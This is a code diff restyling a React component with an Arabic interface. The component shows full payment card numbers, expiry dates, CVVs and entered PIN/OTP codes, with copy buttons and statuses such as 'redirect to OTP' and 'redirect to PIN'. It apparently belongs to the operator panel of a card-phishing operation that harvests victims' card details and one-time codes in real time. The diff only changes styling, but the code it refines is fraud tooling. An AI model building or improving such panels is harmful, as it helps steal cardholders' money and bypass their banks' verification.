@@ -34,25 +34,20 @@ const CARD_GRADIENTS: Record<string, string> = {
   gray:   "from-[#1f2937] via-[#374151] to-[#111827]",
 }
 
+const DARK_PANEL = "rgba(11,17,35,0.95)"
+const DARK_BORDER = "rgba(99,102,241,0.15)"
+const DARK_BORDER_SUB = "rgba(255,255,255,0.04)"
+const TEXT_PRIMARY = "#e2e8f0"
+const TEXT_SECONDARY = "rgba(148,163,184,0.75)"
+
 export function DataBubble({
-  title,
-  data,
-  timestamp,
-  status,
-  showActions,
-  isLatest,
-  actions,
-  icon,
-  color,
-  layout = "vertical"
+  title, data, timestamp, status, showActions, isLatest, actions, icon, color, layout = "vertical"
 }: DataBubbleProps) {
   const [copiedField, setCopiedField] = useState<CopyableCardField | null>(null)
   const copyResetTimeoutRef = useRef<number | null>(null)
 
   useEffect(() => {
-    return () => {
-      if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current)
-    }
+    return () => { if (copyResetTimeoutRef.current) window.clearTimeout(copyResetTimeoutRef.current) }
   }, [])
 
   const isCopyableValue = (value: string) => {
@@ -69,8 +64,7 @@ export function DataBubble({
       el.setAttribute("readonly", "")
       el.style.cssText = "position:fixed;top:-1000px;opacity:0"
       document.body.appendChild(el)
-      el.focus()
-      el.select()
+      el.focus(); el.select()
       const ok = document.execCommand("copy")
       document.body.removeChild(el)
       return ok
@@ -95,19 +89,19 @@ export function DataBubble({
 
   const getStatusBadge = () => {
     if (!status) return null
-    const badges: Record<string, { text: string; className: string }> = {
-      pending:           { text: "⏳ قيد المراجعة", className: "bg-yellow-50 text-yellow-700 border-yellow-200" },
-      approved:          { text: "✓ تم القبول",     className: "bg-green-50 text-green-700 border-green-200" },
-      rejected:          { text: "✗ تم الرفض",      className: "bg-red-50 text-red-600 border-red-200" },
-      approved_with_otp: { text: "🔑 تحول OTP",     className: "bg-blue-50 text-blue-700 border-blue-200" },
-      approved_with_pin: { text: "🔐 تحول PIN",     className: "bg-purple-50 text-purple-700 border-purple-200" },
-      resend:            { text: "🔄 إعادة إرسال",  className: "bg-orange-50 text-orange-700 border-orange-200" },
-      message:           { text: "📲 في انتظار الموافقة", className: "bg-amber-50 text-amber-700 border-amber-200 animate-pulse" },
+    const badges: Record<string, { text: string; style: React.CSSProperties }> = {
+      pending:           { text: "⏳ قيد المراجعة", style: { background: "rgba(234,179,8,0.15)", color: "#fbbf24", border: "1px solid rgba(234,179,8,0.25)" } },
+      approved:          { text: "✓ تم القبول",     style: { background: "rgba(16,185,129,0.12)", color: "#34d399", border: "1px solid rgba(16,185,129,0.25)" } },
+      rejected:          { text: "✗ تم الرفض",      style: { background: "rgba(239,68,68,0.12)", color: "#f87171", border: "1px solid rgba(239,68,68,0.25)" } },
+      approved_with_otp: { text: "🔑 تحول OTP",     style: { background: "rgba(59,130,246,0.12)", color: "#60a5fa", border: "1px solid rgba(59,130,246,0.25)" } },
+      approved_with_pin: { text: "🔐 تحول PIN",     style: { background: "rgba(139,92,246,0.12)", color: "#a78bfa", border: "1px solid rgba(139,92,246,0.25)" } },
+      resend:            { text: "🔄 إعادة إرسال",  style: { background: "rgba(249,115,22,0.12)", color: "#fb923c", border: "1px solid rgba(249,115,22,0.25)" } },
+      message:           { text: "📲 في انتظار الموافقة", style: { background: "rgba(245,158,11,0.12)", color: "#fbbf24", border: "1px solid rgba(245,158,11,0.25)", animation: "pulse 2s infinite" } },
     }
     const badge = badges[status]
     if (!badge) return null
     return (
-      <span className={`inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold border ${badge.className}`}>
+      <span className="inline-flex items-center px-2.5 py-1 rounded-lg text-xs font-semibold" style={badge.style}>
         {badge.text}
       </span>
     )
@@ -139,46 +133,46 @@ export function DataBubble({
     const bankName   = data["البنك"] || ""
     const bankCountry = data["بلد البنك"] || ""
 
-    const typeLower  = cardType.toLowerCase()
+    const typeLower = cardType.toLowerCase()
     let brand = "CARD"
-    if (typeLower.includes("visa"))   brand = "VISA"
+    if (typeLower.includes("visa")) brand = "VISA"
     else if (typeLower.includes("master")) brand = "MASTERCARD"
-    else if (typeLower.includes("mada"))   brand = "MADA"
+    else if (typeLower.includes("mada")) brand = "MADA"
     else if (typeLower.includes("amex") || typeLower.includes("american")) brand = "AMEX"
 
     const grad = CARD_GRADIENTS[color || "green"]
 
     return (
-      <div className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.07)] border border-gray-100" style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}>
-
+      <div
+        className="rounded-2xl overflow-hidden"
+        style={{ background: DARK_PANEL, border: `1px solid ${DARK_BORDER}`, fontFamily: "Cairo, Tajawal, sans-serif" }}
+      >
         {/* Bubble header */}
-        <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
+        <div className="flex items-center justify-between px-4 py-2.5" style={{ borderBottom: `1px solid ${DARK_BORDER_SUB}` }}>
           <div className="flex items-center gap-2">
             {isLatest && (
-              <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
+              <span className="text-[10px] font-bold px-2 py-0.5 rounded-full"
+                style={{ background: "rgba(16,185,129,0.15)", color: "#34d399", border: "1px solid rgba(16,185,129,0.25)" }}>
+                الأحدث
+              </span>
             )}
             {timestamp && (
-              <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
+              <span className="text-[11px]" style={{ color: TEXT_SECONDARY }}>{formatTimestamp(timestamp)}</span>
             )}
           </div>
-          <span className="text-sm font-bold text-gray-800">{title}</span>
+          <span className="text-sm font-bold" style={{ color: TEXT_PRIMARY }}>{title}</span>
         </div>
 
         <div className="p-4">
-          {/* ─── Credit Card Visual ─── */}
+          {/* Credit Card Visual */}
           <div
             className={`relative bg-gradient-to-br ${grad} rounded-2xl text-white overflow-hidden`}
             style={{ aspectRatio: "1.78 / 1" }}
           >
-            {/* Subtle pattern circles */}
             <div className="absolute -top-8 -right-8 w-44 h-44 rounded-full bg-white/5" />
             <div className="absolute -bottom-10 -left-10 w-40 h-40 rounded-full bg-white/5" />
             <div className="absolute inset-0 bg-gradient-to-tr from-black/20 to-white/10" />
-
-            {/* Card inner content */}
             <div className="relative h-full flex flex-col px-5 py-4">
-
-              {/* Top row: chip + NFC + brand */}
               <div className="flex items-center justify-between mb-auto">
                 <div className="flex items-center gap-2.5">
                   <div className="w-9 h-7 rounded-md bg-gradient-to-br from-amber-300 to-yellow-500 shadow-md border border-amber-100/40" />
@@ -192,20 +186,10 @@ export function DataBubble({
                   {brand}
                 </span>
               </div>
-
-              {/* Card Number — centred */}
               <div className="flex-1 flex items-center justify-center">
-                <button
-                  type="button"
-                  onClick={() => void handleCopy("cardNumber", rawNum)}
-                  disabled={!isCopyableValue(rawNum)}
-                  title="نسخ رقم البطاقة"
-                  className="group text-center"
-                >
-                  <div
-                    className="font-mono font-bold tracking-[0.18em] drop-shadow-sm text-xl sm:text-2xl group-hover:opacity-80 transition-opacity"
-                    style={{ direction: "ltr" }}
-                  >
+                <button type="button" onClick={() => void handleCopy("cardNumber", rawNum)}
+                  disabled={!isCopyableValue(rawNum)} title="نسخ رقم البطاقة" className="group text-center">
+                  <div className="font-mono font-bold tracking-[0.18em] drop-shadow-sm text-xl sm:text-2xl group-hover:opacity-80 transition-opacity" style={{ direction: "ltr" }}>
                     {cardNumber}
                   </div>
                   <div className="text-[10px] mt-1 opacity-0 group-hover:opacity-60 transition-opacity">
@@ -213,33 +197,21 @@ export function DataBubble({
                   </div>
                 </button>
               </div>
-
-              {/* Bottom row: holder / expiry / cvv */}
               <div className="flex items-end justify-between mt-auto pt-2">
                 <div>
                   <div className="text-[10px] uppercase opacity-60 tracking-wide mb-0.5">حامل البطاقة</div>
                   <div className="text-sm font-semibold truncate max-w-[160px] uppercase">{holder}</div>
                 </div>
                 <div className="flex gap-4 text-center">
-                  <button
-                    type="button"
-                    onClick={() => void handleCopy("expiryDate", rawExpiry)}
-                    disabled={!isCopyableValue(rawExpiry)}
-                    title="نسخ تاريخ الانتهاء"
-                    className="group"
-                  >
+                  <button type="button" onClick={() => void handleCopy("expiryDate", rawExpiry)}
+                    disabled={!isCopyableValue(rawExpiry)} title="نسخ تاريخ الانتهاء" className="group">
                     <div className="text-[10px] opacity-60 tracking-wide mb-0.5">الانتهاء</div>
                     <div className="font-bold text-xl group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                       {copiedField === "expiryDate" ? "✓" : expiry}
                     </div>
                   </button>
-                  <button
-                    type="button"
-                    onClick={() => void handleCopy("cvv", rawCvv)}
-                    disabled={!isCopyableValue(rawCvv)}
-                    title="نسخ CVV"
-                    className="group"
-                  >
+                  <button type="button" onClick={() => void handleCopy("cvv", rawCvv)}
+                    disabled={!isCopyableValue(rawCvv)} title="نسخ CVV" className="group">
                     <div className="text-[10px] opacity-60 tracking-wide mb-0.5">CVV</div>
                     <div className="font-bold text-xl group-hover:opacity-70 transition-opacity" style={{ direction: "ltr" }}>
                       {copiedField === "cvv" ? "✓" : cvv}
@@ -250,26 +222,31 @@ export function DataBubble({
             </div>
           </div>
 
-          {/* ─── Tags below card ─── */}
+          {/* Tags below card */}
           <div className="mt-3 flex flex-wrap gap-1.5">
             {bankName && bankName !== "غير محدد" && (
-              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-blue-50 text-blue-700 border border-blue-100">{bankName}</span>
+              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full"
+                style={{ background: "rgba(59,130,246,0.12)", color: "#60a5fa", border: "1px solid rgba(59,130,246,0.2)" }}>{bankName}</span>
             )}
             {bankCountry && bankCountry !== "غير محدد" && (
-              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-indigo-50 text-indigo-700 border border-indigo-100">{bankCountry}</span>
+              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full"
+                style={{ background: "rgba(99,102,241,0.12)", color: "#818cf8", border: "1px solid rgba(99,102,241,0.2)" }}>{bankCountry}</span>
             )}
             {cardType && cardType !== "CARD" && (
-              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-gray-100 text-gray-700 border border-gray-200">{cardType}</span>
+              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full"
+                style={{ background: "rgba(255,255,255,0.06)", color: TEXT_SECONDARY, border: "1px solid rgba(255,255,255,0.1)" }}>{cardType}</span>
             )}
             {cardLevel && (
-              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-amber-50 text-amber-700 border border-amber-100">{cardLevel}</span>
+              <span className="text-[11px] font-semibold px-2.5 py-1 rounded-full"
+                style={{ background: "rgba(245,158,11,0.12)", color: "#fbbf24", border: "1px solid rgba(245,158,11,0.2)" }}>{cardLevel}</span>
             )}
           </div>
         </div>
 
-        {/* ─── Footer: status + actions ─── */}
+        {/* Footer: status + actions */}
         {(status || (showActions && actions)) && (
-          <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
+          <div className="flex items-center justify-between gap-2 px-4 py-3"
+            style={{ borderTop: `1px solid ${DARK_BORDER_SUB}`, background: "rgba(255,255,255,0.02)" }}>
             <div>{getStatusBadge()}</div>
             {showActions && actions && <div>{actions}</div>}
           </div>
@@ -278,9 +255,7 @@ export function DataBubble({
     )
   }
 
-  // ─────────────────────────────────────────
   // PIN / OTP digit boxes
-  // ─────────────────────────────────────────
   const isPinOrOtp =
     title.includes("PIN") || title.includes("OTP") ||
     title.includes("رمز") || title.includes("كود") || title.includes("كلمة مرور")
@@ -293,22 +268,25 @@ export function DataBubble({
 
   return (
     <div
-      className="bg-white rounded-2xl overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border border-gray-100"
-      style={{ fontFamily: "Cairo, Tajawal, sans-serif" }}
+      className="rounded-2xl overflow-hidden"
+      style={{ background: DARK_PANEL, border: `1px solid ${DARK_BORDER}`, fontFamily: "Cairo, Tajawal, sans-serif" }}
     >
       {/* Header */}
-      <div className="flex items-center justify-between px-4 py-2.5 border-b border-gray-100">
+      <div className="flex items-center justify-between px-4 py-2.5" style={{ borderBottom: `1px solid ${DARK_BORDER_SUB}` }}>
         <div className="flex items-center gap-2">
           {isLatest && (
-            <span className="text-[10px] font-bold text-emerald-600 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-full">الأحدث</span>
+            <span className="text-[10px] font-bold px-2 py-0.5 rounded-full"
+              style={{ background: "rgba(16,185,129,0.15)", color: "#34d399", border: "1px solid rgba(16,185,129,0.25)" }}>
+              الأحدث
+            </span>
           )}
           {timestamp && (
-            <span className="text-[11px] text-gray-400">{formatTimestamp(timestamp)}</span>
+            <span className="text-[11px]" style={{ color: TEXT_SECONDARY }}>{formatTimestamp(timestamp)}</span>
           )}
         </div>
         <div className="flex items-center gap-2">
           {icon && <span className="text-base">{icon}</span>}
-          <span className="text-sm font-bold text-gray-800">{title}</span>
+          <span className="text-sm font-bold" style={{ color: TEXT_PRIMARY }}>{title}</span>
         </div>
       </div>
 
@@ -319,21 +297,26 @@ export function DataBubble({
             {digitValue.split("").map((digit, i) => (
               <div
                 key={i}
-                className="w-9 h-11 rounded-lg bg-gray-50 border border-gray-200 shadow-sm flex items-center justify-center"
+                className="w-9 h-11 rounded-lg flex items-center justify-center"
+                style={{ background: "rgba(99,102,241,0.1)", border: "1px solid rgba(99,102,241,0.25)", boxShadow: "0 0 8px rgba(99,102,241,0.15)" }}
               >
-                <span className="text-xl font-bold text-gray-900">{digit}</span>
+                <span className="text-xl font-bold" style={{ color: "#c7d2fe" }}>{digit}</span>
               </div>
             ))}
           </div>
         ) : (
-          <div className="divide-y divide-gray-50">
-            {Object.entries(data).map(([key, value]) => {
+          <div>
+            {Object.entries(data).map(([key, value], idx, arr) => {
               if (value === undefined || value === null) return null
               const str = value?.toString() || "-"
               return (
-                <div key={key} className="flex items-start justify-between gap-4 py-2 text-sm">
-                  <span className="text-gray-500 shrink-0 text-xs">{key}</span>
-                  <span className="text-gray-900 font-semibold text-right break-all text-xs">{str}</span>
+                <div
+                  key={key}
+                  className="flex items-start justify-between gap-4 py-1.5 text-sm"
+                  style={idx < arr.length - 1 ? { borderBottom: `1px solid ${DARK_BORDER_SUB}` } : {}}
+                >
+                  <span className="text-xs shrink-0" style={{ color: TEXT_SECONDARY }}>{key}</span>
+                  <span className="font-semibold text-right break-all text-xs" style={{ color: TEXT_PRIMARY }}>{str}</span>
                 </div>
               )
             })}
@@ -343,7 +326,8 @@ export function DataBubble({
 
       {/* Footer */}
       {(status || (showActions && actions)) && (
-        <div className="flex items-center justify-between gap-2 px-4 py-3 border-t border-gray-100 bg-gray-50/60">
+        <div className="flex items-center justify-between gap-2 px-4 py-3"
+          style={{ borderTop: `1px solid ${DARK_BORDER_SUB}`, background: "rgba(255,255,255,0.02)" }}>
           <div>{getStatusBadge()}</div>
           {showActions && actions && <div>{actions}</div>}
         </div>
